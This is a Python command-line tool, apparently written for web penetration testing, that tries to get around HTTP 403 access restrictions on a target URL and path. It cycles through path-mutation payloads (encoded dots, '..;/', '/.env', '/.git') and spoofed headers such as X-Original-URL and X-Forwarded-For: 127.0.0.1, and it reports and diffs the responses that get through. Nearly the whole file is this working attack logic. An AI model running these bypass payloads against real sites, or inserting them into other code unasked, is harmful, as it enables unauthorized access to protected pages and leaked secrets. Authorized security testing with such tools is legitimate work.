import argparse
import requests
import re
import concurrent.futures
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from collections import defaultdict
import difflib
import time

console = Console()

class BypassScanner:
    def __init__(self, url, path, threads=10, timeout=7):
        self.url = url.rstrip('/')
        self.path = path.replace(' ', '-')
        self.threads = threads
        self.timeout = timeout
        self.tested = 0
        self.found = []
        self.summary = []

    def is_valid_url(self):
        return re.match(r'^https?://[^/]+$', self.url)

    def fetch(self, payload, headers=None):
        if headers is None:
            headers = {}
        test_url = f"{self.url}/{payload.lstrip('/')}"
        start = time.time()
        try:
            resp = requests.get(test_url, headers=headers, timeout=self.timeout, allow_redirects=True)
            elapsed = time.time() - start
            code = resp.status_code
            length = len(resp.content)
            content = resp.text[:2000]  # Store first 2k chars for uniqueness check/diff
            title = "-"
            if "text/html" in resp.headers.get("content-type", "") and resp.text:
                soup = BeautifulSoup(resp.text, 'html.parser')
                title = soup.title.string.strip() if soup.title else '-'
            return {
                "url": test_url,
                "code": code,
                "length": length,
                "title": title,
                "headers": headers,
                "payload": payload,
                "elapsed": elapsed,
                "content": content,
            }
        except Exception as e:
            return {
                "url": test_url,
                "code": "ERR",
                "length": 0,
                "title": "-",
                "headers": headers,
                "payload": payload,
                "elapsed": 0,
                "content": f"Error: {e}"
            }

    def run(self):
        if not self.is_valid_url():
            console.print("[red]Invalid URL. Must start with http(s):// and no trailing slash.[/red]")
            return

        payloads = [
            "",
            f"{self.path}%2e", f"{self.path}/.", f"{self.path}//", f"{self.path}/./",
            f"{self.path}%20", f"{self.path}%09", f"{self.path}?{self.path}", f"{self.path}.html", f"{self.path}#", f"{self.path}??",
            f"{self.path}/*", f"{self.path}.php", f"{self.path}.json", f"{self.path}/..;/", f"{self.path}..;/",
            f"{self.path}/%2e/", f"{self.path}/%2e%2e/", f"{self.path}/%0A/", f"{self.path}/.env",
            f"{self.path}/admin", f"{self.path}/login", f"{self.path}/config", f"{self.path}/.git"
        ]
        header_payloads = [
            {},
            {"X-Original-URL": f"/{self.path}"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-rewrite-url": f"/{self.path}"},
            {"X-Host": "127.0.0.1"},
        ]

        jobs = []
        seen = set()
        for p in payloads:
            for h in header_payloads:
                key = (p, tuple(sorted(h.items())))
                if key not in seen:
                    jobs.append((p, h.copy()))
                    seen.add(key)

        console.print(f"\n[bold cyan]Testing {len(jobs)} combinations. Please wait...[/bold cyan]\n")
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            for result in executor.map(lambda j: self.fetch(*j), jobs):
                self.tested += 1
                if result["code"] not in (403, "ERR"):
                    self.found.append(result)
        self.show_results()

    def show_results(self):
        if not self.found:
            console.print("[bold red]No bypassed 403s found.[/bold red]")
            return

        unique_content = {}
        for res in self.found:
            ckey = (res['code'], res['title'], res['length'])
            if ckey not in unique_content:
                unique_content[ckey] = res

        table = Table(show_lines=True, title="403 Bypass Results")
        table.add_column("Status", justify="center")
        table.add_column("URL", overflow="fold")
        table.add_column("Len", justify="right")
        table.add_column("Title")
        table.add_column("Payload", style="magenta")
        table.add_column("Header", style="yellow")
        table.add_column("Time (s)", justify="right")

        for k, res in unique_content.items():
            code = res['code']
            color = "green" if code == 200 else ("cyan" if str(code).startswith("2") else "yellow" if str(code).startswith("3") else "magenta")
            headers = ", ".join([f"{k}: {v}" for k, v in res["headers"].items()]) if res["headers"] else "-"
            table.add_row(
                f"[{color}]{code}[/{color}]",
                res["url"],
                str(res["length"]),
                res["title"],
                res["payload"],
                headers,
                f"{res['elapsed']:.2f}"
            )
        console.print(table)

        console.print(Panel.fit(
            f"Total tested: {self.tested}\n"
            f"Bypasses: {len(self.found)} ({len(unique_content)} unique responses)\n"
            f"Fastest: {min(self.found, key=lambda r: r['elapsed'])['payload']} ({min(self.found, key=lambda r: r['elapsed'])['elapsed']:.2f}s)\n"
            f"Slowest: {max(self.found, key=lambda r: r['elapsed'])['payload']} ({max(self.found, key=lambda r: r['elapsed'])['elapsed']:.2f}s)",
            title="[bold green]Summary[/bold green]"
        ))

        if len(unique_content) > 1:
            diffs = []
            sorted_responses = sorted(unique_content.values(), key=lambda r: r["length"])
            for i in range(len(sorted_responses) - 1):
                diff = difflib.unified_diff(
                    sorted_responses[i]["content"].splitlines(),
                    sorted_responses[i+1]["content"].splitlines(),
                    fromfile=sorted_responses[i]["payload"],
                    tofile=sorted_responses[i+1]["payload"],
                    lineterm=''
                )
                diff = '\n'.join(list(diff)[:8])
                if diff.strip():
                    diffs.append(diff)
            if diffs:
                console.print("\n[bold yellow]Differences between unique bypassed responses (first lines):[/bold yellow]")
                for d in diffs:
                    console.print(Panel(d, expand=False))

def main():
    parser = argparse.ArgumentParser(description='Creative 403 Bypass Scanner')
    parser.add_argument('url', type=str, help='Target URL (e.g., https://example.com)')
    parser.add_argument('path', type=str, help='Path to test (e.g., admin)')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=7, help='Timeout for requests (default: 7s)')
    args = parser.parse_args()

    scanner = BypassScanner(args.url, args.path, threads=args.threads, timeout=args.timeout)
    scanner.run()

if __name__ == "__main__":
    main()
